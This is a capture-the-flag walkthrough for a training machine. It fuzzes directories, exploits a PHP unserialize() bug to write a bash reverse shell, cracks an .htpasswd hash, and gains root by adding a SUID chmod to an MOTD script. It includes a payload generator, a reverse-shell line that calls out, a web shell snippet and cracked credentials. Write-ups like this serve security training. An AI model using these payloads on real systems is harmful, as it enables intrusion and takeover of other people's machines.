# ENUMERATION
---



## OPEN PORTS
---


| PORT | SERVICE |
| :--- | :------ |
| 22 | SSH |
| 80 | HTTP |



# RECONNAISSANCE
---


Let's check the web application first:

![Pasted image 20250407133430.png](../../IMAGES/Pasted%20image%2020250407133430.png)

Source code is the default one too, we need to fuzz:

```
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u "http://10.10.109.3/FUZZ" -ic -c -t 200

 /'___\ /'___\ /'___\
 /\ \__/ /\ \__/ __ __ /\ \__/
 \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
 \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
 \ \_\ \ \_\ \ \____/ \ \_\
 \/_/ \/_/ \/___/ \/_/

 v2.1.0-dev
________________________________________________

 :: Method : GET
 :: URL : http://10.10.109.3/FUZZ
 :: Wordlist : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
 :: Follow redirects : false
 :: Calibration : false
 :: Timeout : 10
 :: Threads : 200
 :: Matcher : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

javascript [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 160ms]
backup [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 157ms]
grid [Status: 301, Size: 309, Words: 20, Lines: 10, Duration: 163ms]
```


We got a `backup` file, let's check it out:

![Pasted image 20250407133732.png](../../IMAGES/Pasted%20image%2020250407133732.png)

We got the `index.php.bak` file, we can visualize the contents of it in order to check for anything unusual:

![Pasted image 20250407134134.png](../../IMAGES/Pasted%20image%2020250407134134.png)

![Pasted image 20250407134241.png](../../IMAGES/Pasted%20image%2020250407134241.png)

This is highly vulnerable, due to this:

- An attacker can craft a malicious serialized payload and pass it via the`debug` GET parameter (e.g.,`?debug=PAYLOAD`).
- The`unserialize()` function will reconstruct the object, triggering the`__destruct()` method of the`FormSubmit` class (or any other class if gadgets exist).
- **Arbitrary File Write**: By controlling`$form_file` and`$message`, an attacker could:
	- Overwrite critical files (e.g.,`.htaccess`,`index.php`). 
	- Write a PHP web shell (e.g.,`<?php system($_GET['cmd']); ?>`) to gain RCE.


Knowing this, we can proceed to exploitation.


# EXPLOITATION
---

We can do the following:

1. Create a `generate_payload.php` file:

```
<?php
class FormSubmit {
 public $form_file;
 public $message;
}

$payload = new FormSubmit();
$payload->form_file = 'shell.php'; // Filename to create
$payload->message = '<?php exec("/bin/bash -c \'bash -i >& /dev/tcp/IP/4444 0>&1\'"); ?>'; // Reverse shell

echo urlencode(serialize($payload));
?>
```

2. Use the `generate_payload.php` file:

```
php generate_payload.php
```

This will output a URL encoded payload, for example:

```
O%3A10%3A%22FormSubmit%22%3A2%3A%7Bs%3A9%3A%22form_file%22%3Bs%3A9%3A%22shell.php%22%3Bs%3A7%3A%22message%22%3Bs%3A74%3A%22%3C%3Fphp+exec%28%22%2Fbin%2Fbash+-c+%27bash+-i+%3E%26+%2Fdev%2Ftcp%2F10.6.34.159%2F4444+0%3E%261%27%22%29%3B+%3F%3E%22%3B%7D
```

Now, use curl to upload the reverse shell:

```
curl "http://10.10.109.3/index.php?debug=GENERATED_PAYLOAD"
```

![Pasted image 20250407135556.png](../../IMAGES/Pasted%20image%2020250407135556.png)

It will upload the file successfully and we can get the reverse shell by visiting:

```
http://TARGET_IP/shell.php
```


If we check our listener, we get the connection:

![Pasted image 20250407135634.png](../../IMAGES/Pasted%20image%2020250407135634.png)

Let's proceed with privilege escalation.



# PRIVILEGE ESCALATION
---


We can begin by stabilizing our shell:

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
/usr/bin/script -qc /bin/bash /dev/null
CTRL + Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export BASH=bash
```

![Pasted image 20250407135735.png](../../IMAGES/Pasted%20image%2020250407135735.png)

We can find this inside of `/var/www/html`:

![Pasted image 20250407141523.png](../../IMAGES/Pasted%20image%2020250407141523.png)

We got a `.htpasswd` file:

```
www-data@osboxes:/var/www/html$ cat .htpasswd
james:$apr1$zPZMix2A$d8fBXH0em33bfI9UTt9Nq1
```

We can crack it using john:

```
echo 'james:$apr1$zPZMix2A$d8fBXH0em33bfI9UTt9Nq1' > hash.txt
```

```
john --format=md5crypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

jamaica (james)
```

We got credentials, let's go into ssh:

```
james:jamaica
```

![Pasted image 20250407141902.png](../../IMAGES/Pasted%20image%2020250407141902.png)

```
james@osboxes:~$ cat user.txt
7e37c84a66cc40b1c6bf700d08d28c20
```

We got a `Note_to_james.txt` file:

```
james@osboxes:~$ cat Note-To-James.txt
Dear James,

As you may already know, we are soon planning to submit this machine to THM's CyberSecurity Platform! Crazy... Isn't it?

But there's still one thing I'd like you to do, before the submission.

Could you please make our ssh welcome message a bit more pretty... you know... something beautiful :D

I gave you access to modify all these files :)

Oh and one last thing... You gotta hurry up! We don't have much time left until the submission!

Best Regards,

root
```

The `/etc/update-motd.d/` directory contains the scripts that generate the MOTD that's displayed on the ssh login, we can check if we are actually able to modify that and if root owns this:

```
ls -ld /etc/update-motd.d/
ls -l /etc/update-motd.d/
```

![Pasted image 20250407142343.png](../../IMAGES/Pasted%20image%2020250407142343.png)

We can modify any of these files to add either a reverse shell or create a SUID binary `, let's for example modify the `99-esm` file:

```
chmod u+s /bin/bash
```

```
cat /etc/update-motd.d/00-header
#!/bin/sh
#
# 00-header - create the header of the MOTD
# Copyright (C) 2009-2010 Canonical Ltd.
#
# Authors: Dustin Kirkland <kirkland@canonical.com>
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License along
# with this program; if not, write to the Free Software Foundation, Inc.,
# 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.

chmod u+s /bin/bash
```

Now, we need to log into ssh again to trigger the payload:

```
ssh james@IP

Once logged use: /bin/bash -p
```

We can see this:

![Pasted image 20250407143046.png](../../IMAGES/Pasted%20image%2020250407143046.png)

There we go, we got root, let's read final flag:

```
bash-4.3# cat /root/root.txt
3c8c3d0fe758c320d158e32f68fabf4b
```


![Pasted image 20250407143141.png](../../IMAGES/Pasted%20image%2020250407143141.png)

